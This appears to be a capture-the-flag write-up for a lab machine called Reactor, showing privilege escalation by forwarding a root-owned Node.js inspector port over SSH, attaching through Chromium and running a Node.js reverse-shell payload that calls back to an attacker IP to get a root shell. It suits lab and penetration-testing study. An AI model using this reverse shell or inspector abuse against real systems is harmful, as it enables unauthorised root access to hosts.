# Root-owned Node.js Inspector

## Identify the privileged debug process

From the engineer shell on Reactor, process and socket enumeration showed a root-owned Node.js worker with its inspector bound to loopback:

```bash
id
ps -elf --forest
netstat -antpu || ss -antpu
cat /opt/uptime-monitor/worker.js
```

```text
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
root ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
127.0.0.1:9229 ... LISTEN
```

The worker used Node's [V8 inspector](https://nodejs.org/api/cli.html#--inspecthostport). The loopback binding meant the debug port was reached through the existing engineer SSH access.

## Forward the port and attach

```bash
ssh engineer@reactor.htb -L 9229:127.0.0.1:9229
```

Open `chrome://inspect` in Chromium and attach to the forwarded `localhost:9229` target. The observed console accepted JavaScript:

```javascript
console.log("hello ice-wzl");
```

## Execute in the root process

Start a listener, then run the observed Node.js reverse-shell code in the inspector console:

```bash
nc -nlvp 80
```

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(80, "10.10.14.213", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

The callback confirmed execution as the inspected root process:

```text
id
uid=0(root) gid=0(root) groups=0(root)
```
